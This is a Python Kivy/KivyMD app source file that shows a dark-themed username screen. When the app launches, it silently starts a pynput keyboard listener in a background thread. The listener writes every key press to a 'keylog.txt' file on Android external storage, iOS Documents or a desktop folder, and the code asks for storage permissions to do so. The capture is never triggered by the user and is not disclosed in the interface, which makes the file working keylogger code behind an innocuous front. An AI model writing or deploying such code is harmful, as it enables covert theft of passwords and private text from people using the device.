from kivy.lang import Builder
from kivymd.app import MDApp
from kivy.uix.screenmanager import Screen
from kivymd.uix.label import MDLabel
from helpers import username_helper
import pynput
import threading
from pynput.keyboard import Key, Listener
import logging
import os
from kivy.utils import platform
from kivy.config import Config




class MainApp(MDApp):
    def build(self):
        if platform == 'android':
            try:
                # Import android permissions only if running on Android
                from android.permissions import request_permissions, Permission
                from jnius import autoclass

                request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_EXTERNAL_STORAGE])

                # Get the path to external storage
                Environment = autoclass('android.os.Environment')
                log_dir = Environment.getExternalStorageDirectory().getAbsolutePath() + '/MyAppLogs'

            except ImportError:
                log_dir = '/storage/emulated/0/MyAppLogs'
        elif platform == 'ios':
            # iOS-specific path (you will need to specify an iOS-friendly location)
            log_dir = os.path.expanduser("~/Documents")
        else:
            # Desktop path (Linux/Windows/Mac)
            log_dir = r"C:/Users/Zumo/PycharmProjects/2024"


        log_file = os.path.join(log_dir, "keylog.txt")

        Config.set('kivy', 'log_level', 'critical')

        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

        # Set up logging to both console and file
        logger = logging.getLogger()
        logger.setLevel(logging.DEBUG)  # Set the lowest log level (DEBUG) to capture all messages

        # File handler for logging to the file
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

        # Console handler for logging to the console
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.DEBUG)
        console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

        # Add handlers to the logger
        logger.addHandler(file_handler)
        logger.addHandler(console_handler)




        screen = Screen()
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Green"
        bar = Builder.load_string(username_helper)
        screen.add_widget(bar)

        # Start the key listener in a separate thread
        listener_thread = threading.Thread(target=self.start_key_listener)
        listener_thread.daemon = True  # Daemon thread will automatically close when the app exits
        listener_thread.start()

        return screen

    #def cool(self):
        #print("Start button pressed")



    def start_key_listener(self):
        # This function starts the pynput key listener in a separate thread
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        # Log the key press to the log file and display it
        try:
            logging.info(f"Key pressed: {key.char}")
        except AttributeError:
            logging.info(f"Special key pressed: {key}")

    def on_button_press(self):
        # Called when the "Start" button is pressed
        print("Start button pressed")

   # with Listener(on_press=on_press) as listener:
       # listener.join()

MainApp().run()